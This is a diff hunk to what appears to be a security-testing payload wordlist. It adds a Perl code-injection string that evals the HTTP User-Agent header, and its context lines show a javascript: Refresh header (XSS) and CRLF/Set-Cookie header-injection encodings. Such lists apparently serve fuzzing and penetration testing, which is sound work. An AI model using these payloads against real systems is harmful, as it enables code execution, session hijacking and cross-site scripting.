@@ -28,4 +28,5 @@ Refresh: 0; URL=http://example.com;URL=javascript:alert(1)
 %d
 %E5%98%8A
 %E5%98%8A%E5%98%8DSet-Cookie:%20test
+POSIX;eval($ENV{HTTP_USER_AGENT});exit;
 /* RFI STOP */
